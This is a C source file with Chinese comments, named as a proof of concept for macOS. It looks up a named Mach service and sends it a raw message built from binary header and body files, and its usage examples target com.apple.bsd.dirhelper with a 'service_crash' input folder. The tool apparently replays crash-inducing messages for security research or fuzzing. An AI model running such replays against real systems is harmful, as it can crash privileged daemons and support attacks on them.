// 自定义消息发送程序 - 发送特定格式的消息
// 编译: clang -o send_poc send_poc.c
// 运行: sudo ./send_poc [-v] <service_name> <folder_path> <index>

#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// 自定义消息结构,消息体为变长
typedef struct {
    mach_msg_header_t header;
    uint8_t body[];  // 变长消息体
} custom_message_t;

// 获取服务端口
mach_port_t get_service_port(const char *service_name) {
    mach_port_t bootstrap_port;
    mach_port_t service_port;
    kern_return_t kr;
    
    // 获取系统 bootstrap 端口 (而不是任务的 bootstrap 端口)
    kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get bootstrap port: %s (0x%x)\n", 
               mach_error_string(kr), kr);
        return MACH_PORT_NULL;
    }
    
    printf("Bootstrap port: 0x%x\n", bootstrap_port);
    
    // 查找服务
    kr = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to look up service: %s (0x%x)\n", 
               mach_error_string(kr), kr);
        return MACH_PORT_NULL;
    }
    
    printf("Service port: 0x%x\n", service_port);
    return service_port;
}

// 发送自定义消息
kern_return_t send_custom_message(mach_port_t service_port, uint8_t *body_data, size_t body_size, mach_msg_size_t msg_size, mach_msg_id_t msg_id, mach_msg_header_t *header_template, int verbose, int dryrun) {
    custom_message_t *msg;
    kern_return_t kr;
    size_t total_size = sizeof(mach_msg_header_t) + body_size;
    
    // 分配消息内存
    msg = (custom_message_t *)malloc(total_size);
    if (!msg) {
        printf("Failed to allocate memory for message\n");
        return KERN_NO_SPACE;
    }
    
    // 清零消息结构
    memset(msg, 0, total_size);
    
    // 设置消息头 - 按照第二个消息（workgroup_msg）的方式构造
    // 不使用 local_port 和 voucher_port
    // OOL标志位 根据msg_header包含复杂数据结构,设置为MACH_MSGH_BITS_COMPLEX,如果msg_body的第一个比特为0则是简单消息，否则是复杂消息 
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(
        MACH_MSG_TYPE_COPY_SEND,      // remote bits - 发送到远程端口
        MACH_PORT_NULL,                // local bits - 不需要回复端口
        MACH_PORT_NULL,                // voucher bits - 不使用
        MACH_PORT_NULL);               // other bits
    
    if(header_template->msgh_bits & MACH_MSGH_BITS_COMPLEX) {
        msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    }

    msg->header.msgh_size = msg_size;  // 使用从文件读取的msg_size
    msg->header.msgh_remote_port = service_port;  // 使用有效的端口
    msg->header.msgh_local_port = MACH_PORT_NULL;   // 不需要回复端口
    msg->header.msgh_voucher_port = MACH_PORT_NULL;  // 按照要求设置
    msg->header.msgh_id = msg_id;  // 使用从文件读取的msg_id
    
    // 复制消息体数据
    memcpy(msg->body, body_data, body_size);
    
    if (verbose || dryrun) {
        printf("\n=== Sending Custom Message ===\n");
        printf("------ MACH MSG HEADER ------\n");
        printf("msg_bits: 0x%x\n", msg->header.msgh_bits);
        printf("msg_size: %u\n", msg->header.msgh_size);
        printf("msg_remote_port: 0x%x\n", msg->header.msgh_remote_port);
        printf("msg_local_port: 0x%x\n", msg->header.msgh_local_port);
        printf("msg_voucher_port: 0x%x\n", msg->header.msgh_voucher_port);
        printf("msg_id: %u\n", msg->header.msgh_id);
        
        // 打印消息头的字节表示
        printf("------ MACH MSG HEADER IN BYTES ------\n");
        uint8_t *header_bytes = (uint8_t *)&msg->header;
        for (int i = 0; i < sizeof(mach_msg_header_t); i++) {
            printf("0x%02x ", header_bytes[i]);
            if ((i + 1) % 4 == 0) printf(" ");
        }
        printf("\n");
        
        // 打印消息体的字节表示
        printf("------ MACH MSG BODY IN BYTES (%zu bytes) ------\n", body_size);
        for (size_t i = 0; i < body_size; i++) {
            printf("0x%02x ", msg->body[i]);
            if ((i + 1) % 4 == 0) printf(" ");
            if ((i + 1) % 32 == 0) printf("\n");
        }
        printf("\n");
    }
    
    if (dryrun) {
        printf("\n[Dryrun] Message constructed but not sent.\n");
        free(msg);
        return KERN_SUCCESS;
    }
    
    // 发送消息(仅发送,不接收回复) - 与 workgroup_msg 的方式相同
    kr = mach_msg(&msg->header,
                  MACH_SEND_MSG,               // 只发送
                  msg->header.msgh_size,        // 发送大小
                  0,                           // 不需要接收
                  MACH_PORT_NULL,              // 不需要接收
                  MACH_MSG_TIMEOUT_NONE,
                  MACH_PORT_NULL);
    
    free(msg);
    
    if (kr != KERN_SUCCESS) {
        printf("mach_msg failed: %s (0x%x)\n", mach_error_string(kr), kr);
        return kr;
    }
    
    if (verbose) {
        printf("Custom message sent successfully!\n");
    }
    return KERN_SUCCESS;
}

int main(int argc, char *argv[]) {
    kern_return_t kr;
    mach_port_t service_port;
    uint8_t *body_data = NULL;
    size_t body_size = 0;
    mach_msg_header_t header_template;
    FILE *fp;
    int verbose = 0;
    int dryrun = 0;
    const char *service_name;
    const char *folder_path;
    int index;
    char header_file[1024];
    char body_file[1024];
    
    printf("=== Custom Message Sender ===\n\n");
    
    // 解析参数
    int arg_idx = 1;
    while (arg_idx < argc && argv[arg_idx][0] == '-') {
        if (strcmp(argv[arg_idx], "-v") == 0) {
            verbose = 1;
        } else if (strcmp(argv[arg_idx], "-dryrun") == 0) {
            dryrun = 1;
        } else {
            printf("Unknown option: %s\n", argv[arg_idx]);
            printf("Usage: %s [-v] [-dryrun] <service_name> <folder_path> <index>\n", argv[0]);
            return 1;
        }
        arg_idx++;
    }

    if (argc - arg_idx != 3) {
        printf("Usage: %s [-v] [-dryrun] <service_name> <folder_path> <index>\n", argv[0]);
        printf("  -v: verbose mode (print message details)\n");
        printf("  -dryrun: dry run mode (print message details but do not send)\n");
        printf("Example: %s com.apple.bsd.dirhelper /path/to/msg_bin/service_crash 0\n", argv[0]);
        printf("Example: %s -v -dryrun com.apple.bsd.dirhelper /path/to/msg_bin/service_crash 0\n", argv[0]);
        return 1;
    }
    
    service_name = argv[arg_idx];
    folder_path = argv[arg_idx + 1];
    index = atoi(argv[arg_idx + 2]);
    
    // 构造文件路径
    snprintf(header_file, sizeof(header_file), "%s/header_%d.bin", folder_path, index);
    snprintf(body_file, sizeof(body_file), "%s/body_%d.bin", folder_path, index);
    
    // 读取header文件
    fp = fopen(header_file, "rb");
    if (!fp) {
        printf("Failed to open header file: %s\n", header_file);
        return 1;
    }
    
    if (fread(&header_template, sizeof(mach_msg_header_t), 1, fp) != 1) {
        printf("Failed to read header from file: %s\n", header_file);
        fclose(fp);
        return 1;
    }
    fclose(fp);
    
    if (verbose) {
        printf("Read header from file: %s\n", header_file);
        printf("Header msgh_size: %u, msgh_id: %u\n", header_template.msgh_size, header_template.msgh_id);
    }
    
    // 读取消息体文件
    fp = fopen(body_file, "rb");
    if (!fp) {
        printf("Failed to open body file: %s\n", body_file);
        return 1;
    }
    
    // 获取文件大小
    fseek(fp, 0, SEEK_END);
    body_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    // 分配内存 (允许 body_size 为 0)
    body_data = (uint8_t *)malloc(body_size);
    if (!body_data && body_size > 0) {
        printf("Failed to allocate memory for body data\n");
        fclose(fp);
        return 1;
    }
    
    // 读取数据
    size_t bytes_read = fread(body_data, 1, body_size, fp);
    fclose(fp);
    
    if (bytes_read != body_size) {
        printf("Failed to read complete body file\n");
        free(body_data);
        return 1;
    }
    
    if (verbose) {
        printf("Read %zu bytes from body file: %s\n", body_size, body_file);
    }
    
    // 获取服务端口
    service_port = get_service_port(service_name);
    if (service_port == MACH_PORT_NULL) {
        if (dryrun) {
            printf("Failed to get service port, but continuing in dryrun mode...\n");
            service_port = MACH_PORT_NULL;
        } else {
            printf("Failed to get service port, exiting...\n");
            free(body_data);
            return 1;
        }
    }
    
    // 发送自定义消息
    kr = send_custom_message(service_port, body_data, body_size, header_template.msgh_size, header_template.msgh_id, &header_template, verbose, dryrun);
    free(body_data);
    
    if (kr != KERN_SUCCESS) {
        printf("Custom message sending failed\n");
        mach_port_deallocate(mach_task_self(), service_port);
        return 1;
    }
    
    // 清理端口
    mach_port_deallocate(mach_task_self(), service_port);
    
    printf("\n=== Message sent successfully ===\n");
    return 0;
}
